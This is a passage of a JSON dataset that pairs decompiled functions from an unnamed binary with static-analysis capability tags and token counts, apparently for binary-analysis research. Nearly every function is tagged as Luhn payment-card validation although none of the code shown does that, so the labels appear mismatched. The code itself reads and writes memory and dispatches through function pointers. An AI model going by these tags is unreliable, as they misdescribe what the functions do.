        "decompiled_code": "\nulong fcn.0004a668(ulong arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    ulong auStackX24 [2];\n    uchar auStack312 [280];\n    \n    iVar2 = fcn.0002f7f8(arg1, 0x2e);\n    if (iVar2 == 0) {\n        uVar3 = 0x2159000d;\n    }\n    else {\n        uVar1 = (iVar2 + 1) - arg1;\n        if (uVar1 < 0x104) {\n            fcn.0002f7d0(auStack312, arg1, uVar1);\n            auStack312[uVar1] = 0;\n            uVar3 = fcn.0002f96c(auStack312, auStackX24);\n            if (uVar3 == 0) {\n                uVar3 = fcn.0004afbc(auStackX24[0], iVar2 + 1, arg2);\n            }\n        }\n        else {\n            uVar3 = 0x2159000b;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 265
    },
    "0004a6f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0004a6f4(ulong arg1, int64_t arg2, int64_t arg3)\n\n{\n    uint uVar1;\n    int64_t arg2_00;\n    int64_t iVar2;\n    \n    if (arg2 == 0) {\n        uVar1 = 0x21590066;\n    }\n    else if (arg3 == 0) {\n        uVar1 = 0x21590067;\n    }\n    else {\n        arg2_00 = fcn.0002fbc4(0x20a);\n        if (arg2_00 == 0) {\n            uVar1 = 0x21590004;\n        }\n        else {\n            iVar2 = fcn.00061be8(arg2_00, arg2, 0x104);\n            if (iVar2 == -1) {\n                uVar1 = 0x21590066;\n            }\n            else {\n                *(arg2_00 + iVar2 * 2) = 0;\n                uVar1 = fcn.0004de80(arg1, arg2_00, arg3);\n            }\n            fcn.0002fc50(arg2_00);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 270
    },
    "0004a958": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.0004a958(ulong arg1, int64_t *arg2)\n\n{\n    uint64_t uVar1;\n    bool bVar2;\n    int64_t iStackX16;\n    int64_t aiStackX24 [2];\n    \n    iStackX16 = arg2[1];\n    aiStackX24[0] = *arg2;\n    uVar1 = fcn.00049dfc(arg1, aiStackX24[0] + 8, &iStackX16, 8);\n    bVar2 = uVar1 == 0;\n    if (bVar2) {\n        uVar1 = fcn.00049dfc(arg1, iStackX16, aiStackX24, 8);\n        bVar2 = uVar1 == 0;\n    }\n    return uVar1 & 0xffffffffffffff00 | bVar2;\n}\n",
        "token_count": 197
    },
    "0004aa70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0004aa70(ulong arg1, uint32_t *arg2)\n\n{\n    uint64_t uVar1;\n    bool bVar2;\n    uint32_t auStackX16 [2];\n    uint32_t auStackX24 [4];\n    \n    auStackX24[0] = *arg2;\n    auStackX16[0] = arg2[1];\n    uVar1 = fcn.00049dfc(arg1, auStackX24[0] + 4, auStackX16, 4);\n    bVar2 = uVar1 == 0;\n    if (bVar2) {\n        uVar1 = fcn.00049dfc(arg1, auStackX16[0], auStackX24, 4);\n        bVar2 = uVar1 == 0;\n    }\n    return uVar1 & 0xffffffffffffff00 | bVar2;\n}\n",
        "token_count": 203
    },
    "0004ab84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0004ab84(ulong arg1, ulong *arg2)\n\n{\n    int32_t iVar1;\n    char acStackX16 [8];\n    int64_t aiStackX24 [2];\n    uchar auStack344 [52];\n    uint32_t uStack292;\n    uchar auStack232 [104];\n    uint32_t uStack128;\n    \n    aiStackX24[0] = 0;\n    if (arg2 == NULL) {\n        return 0x21590066;\n    }\n    iVar1 = fcn.00049f40(aiStackX24, 0x438, arg1);\n    if ((iVar1 == 0) && (iVar1 = fcn.00049d80(aiStackX24[0], acStackX16),  iVar1 == 0)) {\n        if (acStackX16[0] == '\\0') {\n            iVar1 = fcn.00049dcc(aiStackX24[0], *arg2, auStack232, 200);\n            if (iVar1 != 0) goto code_r0x0004acdb;\n            uStack128 = uStack128 & 0xffffefff | 0xc4000;\n            iVar1 = fcn.00049dfc(aiStackX24[0], *arg2, auStack232, 200);\n        }\n        else {\n            iVar1 = fcn.00049dcc(aiStackX24[0], *arg2, auStack344, 0x68);\n            if (iVar1 != 0) goto code_r0x0004acdb;\n            uStack292 = uStack292 & 0xffffefff | 0xc4000;\n            iVar1 = fcn.00049dfc(aiStackX24[0], *arg2, auStack344, 0x68);\n        }\n        if (iVar1 == 0) {\n            iVar1 = 0;\n        }\n    }\ncode_r0x0004acdb:\n    if (aiStackX24[0] != 0) {\n        fcn.000619de();\n    }\n    return iVar1;\n}\n",
        "token_count": 460
    },
    "0004acfc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0004acfc(int64_t arg1, ulong noname_1, uint64_t *arg3)\n\n{\n    uint32_t *arg2;\n    uint32_t uVar1;\n    uint64_t uVar2;\n    uint32_t auStackX16 [4];\n    int64_t iStackX32;\n    uchar auStack72 [8];\n    uint64_t uStack64;\n    \n    if (noname_1 != '\\0') {\n        uVar2 = fcn.00061a92(arg1, 0, auStack72, 0x30, 0);\n        if (uVar2 != 0) {\n            return uVar2;\n        }\n        *arg3 = uStack64;\n        return ~-(uStack64 != 0) & 0x21590005;\n    }\n    iStackX32 = 0;\n    auStackX16[0] = 0;\n    if (arg1 == -1) {\n        iStackX32 = -2;\n    }\n    else {\n        uVar1 = fcn.00049c10(arg1, 0x48, &iStackX32);\n        uVar2 = uVar1;\n        if (uVar1 != 0) goto code_r0x0004ae26;\n    }\n    uVar1 = fcn.0001e9a8(iStackX32, 0, auStack72, 0x30);\n    uVar2 = uVar1;\n    if (uVar1 == 0) {\n        if ((uStack64 == 0) || (arg2 = uStack64 + 0x2030,  arg2 == NULL)) {\n            uVar2 = 0x21590005;\n        }\n        else {\n            if (arg1 == 0) {\n                auStackX16[0] = *arg2;\n            }\n            else {\n                uVar1 = fcn.0002fb84(arg1, arg2, auStackX16);\n                uVar2 = uVar1;\n                if (uVar1 != 0) goto code_r0x0004ae26;\n            }\n            *arg3 = auStackX16[0];\n            uVar2 = ~-(auStackX16[0] != 0) & 0x21590005;\n        }\n    }\ncode_r0x0004ae26:\n    if (iStackX32 != 0) {\n        fcn.000619de();\n    }\n    return uVar2;\n}\n",
        "token_count": 547
    },
    "0004ae44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0004ae44(ulong arg1, uint32_t *arg2)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    uint32_t *apuStackX16 [3];\n    \n    uVar4 = 0;\n    apuStackX16[0] = NULL;\n    if (arg2 == NULL) {\n        return 0x21590067;\n    }\n    uVar1 = fcn.0002f490(5, apuStackX16);\n    puVar2 = apuStackX16[0];\n    if (uVar1 == 0) {\n        do {\n            if (*(puVar2 + 0x14) == arg1) goto code_r0x0004ae9d;\n            puVar2 = puVar2 + *puVar2;\n        } while (*puVar2 != 0);\n        if (*(puVar2 + 0x14) == arg1) {\ncode_r0x0004ae9d:\n            if (puVar2[1] != 0) {\n                if (puVar2[1] != 0) {\n                    puVar3 = puVar2 + 0x4c;\n                    uVar4 = 0;\n                    do {\n                        *arg2 = *puVar3;\n                        uVar1 = fcn.00061a38();\n                        if ((arg1 != uVar1) || (uVar1 = fcn.00061b64(),  *arg2 != uVar1)) break;\n                        uVar4 = uVar4 + 1;\n                        puVar3 = puVar3 + 0x14;\n                    } while (uVar4 < puVar2[1]);\n                }\n                uVar1 = ~-(uVar4 < puVar2[1]) & 0x21590005;\n                goto code_r0x0004aee4;\n            }\n        }\n        uVar1 = 0x21590005;\n    }\ncode_r0x0004aee4:\n    fcn.0002fc50(apuStackX16[0]);\n    return uVar1;\n}\n",
        "token_count": 481
    },
    "0004b164": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0004b164(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    char *arg2_00;\n    char acStackX24 [16];\n    \n    arg2_00 = acStackX24;\n    iVar1 = fcn.00049d34(arg1, arg2_00);\n    if (iVar1 == 0) {\n        fcn.0004acfc(arg1, arg2_00 & 0xffffffffffffff00 | acStackX24[0] == '\\0', arg2);\n    }\n    return;\n}\n",
        "token_count": 126
    },
    "0004b198": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0004b198(ulong noname_0, int64_t *arg2)\n\n{\n    uint64_t uVar1;\n    uchar auStack56 [8];\n    int64_t iStack48;\n    \n    uVar1 = fcn.00061a92(noname_0, 0, auStack56, 0x30, 0);\n    if (uVar1 == 0) {\n        *arg2 = iStack48;\n        uVar1 = ~-(iStack48 != 0) & 0x21590005;\n    }\n    return uVar1;\n}\n",
        "token_count": 134
    },
    "0004b974": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0004b974(ulong arg1, uint64_t arg2, int32_t *arg3)\n\n{\n    int32_t iVar1;\n    uint64_t arg2_00;\n    uint64_t arg2_01;\n    uint32_t uStackX16;\n    uint uStackX20;\n    int64_t iStackX32;\n    int64_t iStack416;\n    uint32_t uStack404;\n    uchar auStack400 [20];\n    uint32_t uStack380;\n    int64_t iStack376;\n    uchar auStack360 [24];\n    uint32_t uStack336;\n    int64_t iStack328;\n    int16_t iStack304;\n    uchar auStack248 [48];\n    uint64_t uStack200;\n    int16_t iStack140;\n    \n    iStackX32 = 0;\n    if (arg2 == 0) {\n        return 0x21590066;\n    }\n    if (arg3 == NULL) {\n        return 0x21590067;\n    }\n    iVar1 = fcn.00049f40(&iStackX32, 0x410, arg1);\n    if ((iVar1 == 0) && (iVar1 = fcn.00049d80(iStackX32, &uStackX16),  iVar1 == 0)) {\n        iVar1 = fcn.0004b164(iStackX32, &uStackX16);\n        if (iVar1 == 0) {\n            if (uStackX16 == '\\0') {\n                iVar1 = fcn.00049dcc(iStackX32, CONCAT44(uStackX20, uStackX16), auStack400, 0x20);\n                if (iVar1 == 0) {\n                    if (iStack376 == 0) {\n                        iVar1 = -1;\n                    }\n                    else {\n                        iVar1 = fcn.00049dcc(iStackX32, iStack376, auStack360, 0x40);\n                        if (iVar1 == 0) {\n                            do {\n                                if (iStack328 == iStack376 + 0x20) goto code_r0x0004bc11;\n                                iVar1 = fcn.00049dcc(iStackX32, iStack328, &iStack416, 0x10);\n                                if ((iVar1 != 0) ||\n                                   (iVar1 = fcn.00049dcc(iStackX32, iStack328 + -0x10, auStack248, 0x88),  iVar1 != 0))\n                                goto code_r0x0004bc2a;\n                                iStack328 = iStack416;\n                            } while (uStack200 != arg2);\n                            *arg3 = iStack140;\n                            iVar1 = 0;\n                        }\n                    }\n                }\n            }\n            else {\n                iVar1 = fcn.00049dcc(iStackX32, CONCAT44(uStackX20, uStackX16), &iStack416, 0x10);\n                if (iVar1 == 0) {\n                    arg2_00 = uStack404;\n                    if (arg2_00 == 0) {\n                        iVar1 = uStack404 - 1;\n                    }\n                    else {\n                        iVar1 = fcn.00049dcc(iStackX32, arg2_00, auStack400, 0x24);\n                        if (iVar1 == 0) {\n                            do {\n                                arg2_01 = uStack380;\n                                if (arg2_01 == arg2_00 + 0x14) goto code_r0x0004bc11;\n                                iVar1 = fcn.00049dcc(iStackX32, arg2_01, &uStackX16, 8);\n                                if ((iVar1 != 0) ||\n                                   (iVar1 = fcn.00049dcc(iStackX32, arg2_01 - 8, auStack360, 0x48),  iVar1 != 0))\n                                goto code_r0x0004bc2a;\n                                uStack380 = uStackX16;\n                            } while (uStack336 != arg2);\n                            *arg3 = iStack304;\n                            iVar1 = 0;\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0004bc2a:\n    if (iStackX32 != 0) {\n        fcn.000619de();\n    }\n    return iVar1;\ncode_r0x0004bc11:\n    *arg3 = 0;\n    iVar1 = 0;\n    goto code_r0x0004bc2a;\n}\n",
        "token_count": 1000
    },
    "0004c898": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0004c898(ulong arg1, uint64_t arg2)\n\n{\n    int32_t iVar1;\n    uint64_t arg2_00;\n    int64_t arg2_01;\n    uint64_t arg2_02;\n    uint32_t uStackX16;\n    uint uStackX20;\n    int16_t aiStackX24 [4];\n    int64_t iStackX32;\n    int64_t iStack416;\n    uint32_t uStack404;\n    uchar auStack400 [20];\n    uint32_t uStack380;\n    int64_t iStack376;\n    uchar auStack360 [24];\n    uint32_t uStack336;\n    int64_t iStack328;\n    uchar auStack248 [48];\n    uint64_t uStack200;\n    \n    iStackX32 = 0;\n    if (arg2 == 0) {\n        return 0x21590066;\n    }\n    iVar1 = fcn.00049f40(&iStackX32, 0x438, arg1);\n    if ((iVar1 == 0) && (iVar1 = fcn.00049d80(iStackX32, &uStackX16),  iVar1 == 0)) {\n        iVar1 = fcn.0004b164(iStackX32, &uStackX16);\n        if (iVar1 == 0) {\n            if (uStackX16 == '\\0') {\n                iVar1 = fcn.00049dcc(iStackX32, CONCAT44(uStackX20, uStackX16), auStack400, 0x20);\n                if (iVar1 == 0) {\n                    if (iStack376 == 0) {\n                        iVar1 = -1;\n                    }\n                    else {\n                        iVar1 = fcn.00049dcc(iStackX32, iStack376, auStack360, 0x40);\n                        if (iVar1 == 0) {\n                            do {\n                                arg2_01 = iStack328;\n                                if (arg2_01 == iStack376 + 0x20) goto code_r0x0004cc0c;\n                                iVar1 = fcn.00049dcc(iStackX32, arg2_01, &iStack416, 0x10);\n                                if ((iVar1 != 0) ||\n                                   (iVar1 = fcn.00049dcc(iStackX32, arg2_01 + -0x10, auStack248, 0x88),  iVar1 != 0))\n                                goto code_r0x0004cc20;\n                                iStack328 = iStack416;\n                            } while (uStack200 != arg2);\n                            iVar1 = fcn.00049dcc(iStackX32, arg2_01 + 0x5c, aiStackX24, 2);\n                            if (iVar1 == 0) {\n                                if ((aiStackX24[0] != 0) && (aiStackX24[0] != -1)) {\n                                    aiStackX24[0] = aiStackX24[0] + -1;\n                                    iVar1 = fcn.00049dfc(iStackX32, arg2_01 + 0x5c, aiStackX24, 2);\n                                    if (iVar1 != 0) goto code_r0x0004cc20;\n                                }\n                                iVar1 = 0;\n                            }\n                        }\n                    }\n                }\n            }\n            else {\n                iVar1 = fcn.00049dcc(iStackX32, CONCAT44(uStackX20, uStackX16), &iStack416, 0x10);\n                if (iVar1 == 0) {\n                    arg2_00 = uStack404;\n                    if (arg2_00 == 0) {\n                        iVar1 = uStack404 - 1;\n                    }\n                    else {\n                        iVar1 = fcn.00049dcc(iStackX32, arg2_00, auStack400, 0x24);\n                        if (iVar1 == 0) {\n                            do {\n                                arg2_02 = uStack380;\n                                if (arg2_02 == arg2_00 + 0x14) goto code_r0x0004cc0c;\n                                iVar1 = fcn.00049dcc(iStackX32, arg2_02, &uStackX16, 8);\n                                if ((iVar1 != 0) ||\n                                   (iVar1 = fcn.00049dcc(iStackX32, arg2_02 - 8, auStack360, 0x48),  iVar1 != 0))\n                                goto code_r0x0004cc20;\n                                uStack380 = uStackX16;\n                            } while (uStack336 != arg2);\n                            iVar1 = fcn.00049dcc(iStackX32, arg2_02 + 0x30, aiStackX24, 2);\n                            if (iVar1 == 0) {\n                                if ((aiStackX24[0] != 0) && (aiStackX24[0] != -1)) {\n                                    aiStackX24[0] = aiStackX24[0] + -1;\n                                    iVar1 = fcn.00049dfc(iStackX32, arg2_02 + 0x30, aiStackX24, 2);\n                                    if (iVar1 != 0) goto code_r0x0004cc20;\n                                }\n                                iVar1 = 0;\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x0004cc20:\n    if (iStackX32 != 0) {\n        fcn.000619de();\n    }\n    return iVar1;\ncode_r0x0004cc0c:\n    iVar1 = -1;\n    goto code_r0x0004cc20;\n}\n",
        "token_count": 1261
    },
    "0004cc44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0004cc44(ulong *arg1)\n\n{\n    uint64_t arg1_00;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    uint64_t uStackX8;\n    ulong uStackX16;\n    ulong uStackX24;\n    ulong uStackX32;\n    uchar auStack696 [32];\n    int64_t iStack664;\n    int32_t iStack504;\n    int32_t iStack496;\n    int32_t iStack480;\n    int32_t iStack464;\n    int32_t iStack456;\n    int32_t iStack448;\n    \n    uStackX24 = 0;\n    uStackX16 = 0;\n    if (arg1 == NULL) {\n        iVar2 = 0x21590066;\n    }\n    else {\n        uVar1 = fcn.00061a38();\n        iVar2 = fcn.0004c36c(uVar1, 0x15d90);\n        if ((iVar2 == 0) && (iVar2 = fcn.0004afbc(uStackX32, 0x15d78, &uStackX8),  iVar2 == 0)) {\n            fcn.00050e08(auStack696);\n            fcn.0004f4b8(auStack696);\n            arg1_00 = uStackX8;\n            iVar3 = fcn.0001a8b4(uStackX8, 0x1000 - (uStackX8 & 0xfff), 0, &uStackX24);\n            if (iVar3 == 0) {\n                uVar5 = arg1_00 & 0xfffffffffffff000;\n                iVar3 = fcn.0001a8b4(uVar5 + 0x1000, 0x1000, 0, &uStackX16);\n                fcn.0004f2e8(auStack696, uStackX8);\n                do {\n                    iVar4 = fcn.00050e40(auStack696);\n                    if (iVar4 == 0) goto code_r0x0004cde0;\n                    if (iStack504 == 0x1be) {\n                        iVar2 = -1;\n                        goto code_r0x0004cde0;\n                    }\n                } while ((((iStack504 != 0x118) || (iStack496 != 0x8c)) || (iStack480 != 0x36)) ||\n                        ((iStack464 != 0x8d || (iStack448 != 0x8b))));\n                iVar2 = 0;\n                *arg1 = *(iStack456 + iStack664);\ncode_r0x0004cde0:\n                fcn.0005cbfc(1);\n                if (iVar3 == 0) {\n                    fcn.0001a924(uVar5 + 0x1000, uStackX16);\n                }\n                fcn.0001a924(arg1_00, uStackX24);\n            }\n            else {\n                iVar2 = -1;\n            }\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 705
    },
    "0004d428": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0004d428(ulong arg1, int64_t arg2, ulong arg3)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    \n    if (arg2 == 0) {\n        uVar1 = 0x21590066;\n    }\n    else {\n        iVar2 = fcn.00061bee(arg2, 0x5c);\n        if (iVar2 == 0) {\n            fcn.00061bee(arg2, 0x2f);\n        }\n        uVar1 = fcn.0004c36c(arg1, arg2);\n    }\n    return uVar1;\n}\n",
        "token_count": 141
    },
    "0004d7bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0004d7bc(ulong arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    uint uVar1;\n    int64_t arg3_00;\n    int64_t iVar2;\n    int64_t arg4_00;\n    \n    arg3_00 = 0;\n    arg4_00 = 0;\n    if (arg2 == 0) {\n        return 0x21590066;\n    }\n    if (arg3 == 0) {\ncode_r0x0004d828:\n        if (arg4 != 0) {\n            arg4_00 = fcn.0002fbc4(0x20a);\n            if (arg4_00 == 0) goto code_r0x0004d7ff;\n            iVar2 = fcn.00061be8(arg4_00, arg4, 0x104);\n            if (iVar2 == -1) goto code_r0x0004d81d;\n            *(arg4_00 + iVar2 * 2) = 0;\n        }\n        uVar1 = fcn.0004ce28(arg1, arg2, arg3_00, arg4_00);\n    }\n    else {\n        arg3_00 = fcn.0002fbc4(0x20a);\n        if (arg3_00 != 0) {\n            iVar2 = fcn.00061be8(arg3_00, arg3, 0x104);\n            if (iVar2 != -1) {\n                *(arg3_00 + iVar2 * 2) = 0;\n                goto code_r0x0004d828;\n            }\ncode_r0x0004d81d:\n            uVar1 = 0x21590066;\n            goto code_r0x0004d87c;\n        }\ncode_r0x0004d7ff:\n        uVar1 = 0x21590004;\n    }\ncode_r0x0004d87c:\n    fcn.0002fc50(arg4_00);\n    fcn.0002fc50(arg3_00);\n    return uVar1;\n}\n",
        "token_count": 471
    },
    "0004dd68": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0004dd68(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    uint uVar1;\n    int64_t arg2_00;\n    int64_t iVar2;\n    \n    arg2_00 = fcn.0002fbc4(0x20a);\n    if (arg2_00 == 0) {\n        uVar1 = 0x21590004;\n    }\n    else {\n        iVar2 = fcn.00061be8(arg2_00, arg2, 0x104);\n        if (iVar2 == -1) {\n            uVar1 = 0x21590004;\n        }\n        else {\n            *(arg2_00 + 0x104) = 0;\n            uVar1 = fcn.0004d428(arg1, arg2_00, arg3);\n        }\n        fcn.0002fc50(arg2_00);\n    }\n    return uVar1;\n}\n",
        "token_count": 209
    },
    "0004de80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0004de80(ulong arg1, int64_t arg2, int64_t arg3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    ulong auStackX16 [2];\n    code *pcStackX32;\n    uint auStack40 [2];\n    int64_t iStack32;\n    int64_t iStack24;\n    uint32_t uStack16;\n    \n    if (arg2 == 0) {\n        uVar3 = 0x21590066;\n    }\n    else if (arg3 == 0) {\n        uVar3 = 0x21590067;\n    }\n    else {\n        auStack40[0] = arg1;\n        iStack32 = arg2;\n        iStack24 = arg3;\n        iVar1 = fcn.0002f718();\n        if ((0x1a < iVar1) && ((**0x114d0)(&pcStackX32, auStackX16),  auStackX16 - pcStackX32 < 0x2000)) {\n            uVar3 = fcn.0002f96c(0x11c98, auStackX16);\n            if (uVar3 != 0) {\n                return uVar3;\n            }\n            uVar3 = fcn.0004afbc(auStackX16[0], 0x15db8, &pcStackX32);\n            if (uVar3 != 0) {\n                return uVar3;\n            }\n            uVar2 = (*pcStackX32)(fcn.0004d89c, auStack40, 0xe800, 1, 0);\n            if (uVar2 != 0) {\n                uStack16 = uVar2;\n            }\n            return uStack16;\n        }\n        iVar1 = fcn.0002f718();\n        if ((iVar1 < 0x1b) && ((**0x114d0)(&pcStackX32, auStackX16),  auStackX16 - pcStackX32 < 0xc00)) {\n            return 0x21590004;\n        }\n        fcn.0004d89c(auStack40);\n        uVar3 = uStack16;\n    }\n    return uVar3;\n}\n",
        "token_count": 506
    },
    "0004e868": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0004e868(uint64_t arg1, int64_t arg2, int64_t arg3, int64_t arg4)\n\n{\n    ulong uVar1;\n    int32_t aiStackX16 [6];\n    \n    if (arg2 == 0) {\n        uVar1 = 0x21590066;\n    }\n    else if (arg3 == 0) {\n        uVar1 = 0x21590067;\n    }\n    else if (arg4 == 0) {\n        uVar1 = 0x21590068;\n    }\n    else {\n        uVar1 = fcn.0004b974(arg1, arg2, aiStackX16);\n        if (uVar1 == 0) {\n            if (aiStackX16[0] == 0) {\n                uVar1 = 0x21590005;\n            }\n            else {\n                uVar1 = fcn.0004e6ac(arg1 & 0xffffffff, arg2, arg3, arg4);\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 237
    },
    "0004e8d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0004e8d4(int64_t arg1)\n\n{\n    int32_t iVar1;\n    uint auStack56 [2];\n    ulong uStack48;\n    ulong uStack40;\n    uint uStack32;\n    ulong uStack24;\n    ulong uStack16;\n    \n    *(arg1 + 0x77) = 1;\n    iVar1 = fcn.0004e868(*(arg1 + 0x17), *(arg1 + 0xf), 0x11e20, arg1 + 0x97);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0004ae44(*(arg1 + 0x17), arg1 + 0x2f);\n        if (iVar1 == 0) {\n            auStack56[0] = 0x30;\n            uStack48 = 0;\n            uStack32 = 0x200;\n            uStack40 = 0;\n            uStack24 = 0;\n            uStack16 = 0;\n            iVar1 = fcn.00061ae6(arg1 + 0x43, 0x10000000, auStack56, 0, 0);\n            if (iVar1 == 0) {\n                *(arg1 + 0x53) = 0;\n                *(arg1 + 0x5b) = 0;\n                *(arg1 + 0x4b) = 0;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 325
    },
    "0004eb70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0004eb70(ulong arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    int64_t iStack216;\n    uchar auStack208 [15];\n    uint uStack193;\n    uint uStack117;\n    ulong uStack113;\n    ulong uStack105;\n    \n    iStack216 = 0;\n    fcn.00061a56(auStack208, 0, 0x9f);\n    if (arg2 == 0) {\n        uVar1 = 0x21590066;\n    }\n    else {\n        uStack117 = 0;\n        iStack216 = arg2;\n        uStack193 = arg1;\n        uStack113 = arg3;\n        uStack105 = arg4;\n        uVar1 = fcn.0004eae8(&iStack216);\n    }\n    return uVar1;\n}\n",
        "token_count": 200
    },
    "0004ebe8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0004ebe8(ulong arg1, int64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    int64_t iStack216;\n    uchar auStack208 [15];\n    uint uStack193;\n    uint uStack117;\n    int64_t iStack113;\n    uint uStack105;\n    \n    iStack216 = 0;\n    fcn.00061a56(auStack208, 0, 0x9f);\n    if (arg2 == 0) {\n        uVar1 = 0x21590066;\n    }\n    else if (arg3 == 0) {\n        uVar1 = 0x21590067;\n    }\n    else {\n        uStack117 = 1;\n        iStack216 = arg2;\n        uStack193 = arg1;\n        iStack113 = arg3;\n        uStack105 = arg4;\n        uVar1 = fcn.0004eae8(&iStack216);\n    }\n    return uVar1;\n}\n",
        "token_count": 230
    },
    "0004ee74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.0004ee74(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    ulong auStackX16 [2];\n    code *pcStackX32;\n    uint auStack40 [2];\n    ulong uStack32;\n    uint32_t uStack20;\n    \n    uStack20 = 0xffffffff;\n    auStack40[0] = arg1;\n    uStack32 = arg2;\n    iVar1 = fcn.0002f718();\n    if ((iVar1 < 0x1b) || ((**0x114d0)(&pcStackX32, auStackX16),  0x1fff < auStackX16 - pcStackX32)) {\n        iVar1 = fcn.0002f718();\n        if ((iVar1 < 0x1b) && ((**0x114d0)(&pcStackX32, auStackX16),  auStackX16 - pcStackX32 < 0xc00)) {\n            return 0x21590004;\n        }\n        fcn.0004ec6c(auStack40);\n        return uStack20;\n    }\n    uVar3 = fcn.0002f96c(0x11c98, auStackX16);\n    if (uVar3 != 0) {\n        return uVar3;\n    }\n    uVar3 = fcn.0004afbc(auStackX16[0], 0x15db8, &pcStackX32);\n    if (uVar3 != 0) {\n        return uVar3;\n    }\n    uVar2 = (*pcStackX32)(fcn.0004ec6c, auStack40, 0xe800, 1, 0);\n    if (uVar2 != 0) {\n        uStack20 = uVar2;\n    }\n    return uStack20;\n}\n",
        "token_count": 427
    },
    "0004f238": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid fcn.0004f238(int64_t arg1)\n\n{\n    *(arg1 + 0xc0) = 0x24c;\n    *(arg1 + 0x128) = 0;\n    *(arg1 + 299) = 0;\n    *(arg1 + 300) = 0;\n    *(arg1 + 0x12d) = 0;\n    *(arg1 + 0x130) = 0;\n    *(arg1 + 0x12e) = 0;\n    *(arg1 + 0x12a) = 0;\n    *(arg1 + 0x129) = 0;\n    *(arg1 + 0x131) = 0;\n    *(arg1 + 0xb8) = 0;\n    fcn.00061a56(arg1 + 200, 0, 0x20);\n    fcn.00061a56(arg1 + 0xe8, 0, 0x20);\n    // WARNING: Could not recover jumptable at 0x00061a56. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x11160)(arg1 + 0x108, 0, 0x20);\n    return;\n}\n",
        "token_count": 279
    },
    "0004fb20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
